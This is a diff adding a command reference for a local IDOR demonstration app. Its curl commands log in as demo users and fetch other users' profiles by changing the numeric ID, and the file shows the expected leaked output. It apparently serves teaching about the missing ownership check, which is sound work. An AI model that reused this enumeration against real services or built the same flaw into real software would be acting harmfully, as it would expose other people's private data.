@@ -1,0 +1,116 @@
+# IDOR Demo - Command Reference
+# Copy and paste these commands to reproduce the vulnerability demonstration
+
+# ============================================================================
+# 1. START THE APPLICATION
+# ============================================================================
+
+docker compose up --build
+
+# Wait for "Running on http://127.0.0.1:5000" message
+
+
+# ============================================================================
+# 2. LOGIN AS ALICE (User ID 1)
+# ============================================================================
+
+curl -X POST http://127.0.0.1:5000/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "alice", "password": "demo123"}'
+
+# Expected output:
+# {"message":"Logged in as alice","success":true,"token":"alice"}
+
+
+# ============================================================================
+# 3. ACCESS ALICE'S OWN PROFILE (ID 1) - LEGITIMATE ACCESS
+# ============================================================================
+
+curl -X GET http://127.0.0.1:5000/profile/1 \
+  -H "X-Demo-Auth: alice"
+
+# Expected output:
+# {"department":"Engineering","email":"alice.johnson@demo.local","id":1,"name":"Alice Johnson","notes":"Lead developer on Project Alpha. Prefers morning standups."}
+
+
+# ============================================================================
+# 4. IDOR EXPLOIT: ACCESS BOB'S PROFILE (ID 2) AS ALICE - UNAUTHORIZED ACCESS
+# ============================================================================
+
+curl -X GET http://127.0.0.1:5000/profile/2 \
+  -H "X-Demo-Auth: alice"
+
+# Expected output (THIS SHOULD NOT BE ALLOWED!):
+# {"department":"Marketing","email":"bob.smith@demo.local","id":2,"name":"Bob Smith","notes":"Working on Q4 campaign. Available for client meetings."}
+
+# VULNERABILITY DEMONSTRATED: Alice (ID 1) can access Bob's (ID 2) profile
+# The server only checked authentication, not authorization (ownership)
+
+
+# ============================================================================
+# 5. ACCESS CHARLIE'S PROFILE (ID 3) AS ALICE - ANOTHER UNAUTHORIZED ACCESS
+# ============================================================================
+
+curl -X GET http://127.0.0.1:5000/profile/3 \
+  -H "X-Demo-Auth: alice"
+
+# Expected output (THIS SHOULD NOT BE ALLOWED!):
+# {"department":"Sales","email":"charlie.brown@demo.local","id":3,"name":"Charlie Brown","notes":"Top performer this quarter. Specializes in enterprise accounts."}
+
+
+# ============================================================================
+# 6. LOGIN AS BOB AND ACCESS ALICE'S PROFILE - REVERSE EXPLOIT
+# ============================================================================
+
+# Login as Bob
+curl -X POST http://127.0.0.1:5000/login \
+  -H "Content-Type: application/json" \
+  -d '{"username": "bob", "password": "demo123"}'
+
+# Access Alice's profile as Bob (unauthorized)
+curl -X GET http://127.0.0.1:5000/profile/1 \
+  -H "X-Demo-Auth: bob"
+
+# Expected output (THIS SHOULD NOT BE ALLOWED!):
+# {"department":"Engineering","email":"alice.johnson@demo.local","id":1,"name":"Alice Johnson","notes":"Lead developer on Project Alpha. Prefers morning standups."}
+
+
+# ============================================================================
+# 7. ATTEMPT ACCESS WITHOUT AUTHENTICATION - SHOULD FAIL
+# ============================================================================
+
+curl -X GET http://127.0.0.1:5000/profile/1
+
+# Expected output:
+# {"error":"Authentication required. Send X-Demo-Auth header with your username."}
+
+
+# ============================================================================
+# 8. ATTEMPT ACCESS WITH INVALID USER ID - SHOULD FAIL
+# ============================================================================
+
+curl -X GET http://127.0.0.1:5000/profile/999 \
+  -H "X-Demo-Auth: alice"
+
+# Expected output:
+# {"error":"User with ID 999 not found"}
+
+
+# ============================================================================
+# BROWSER-BASED DEMO
+# ============================================================================
+
+# 1. Open browser: http://127.0.0.1:5000
+# 2. Login as alice (username: alice, password: demo123)
+# 3. Click "Profile 2 (Bob)" link
+# 4. Observe that you can view Bob's profile even though you're logged in as Alice
+# 5. Try accessing Profile 3 (Charlie) as well
+
+
+# ============================================================================
+# STOP THE APPLICATION
+# ============================================================================
+
+# Press Ctrl+C in the terminal, or run:
+docker compose down
+
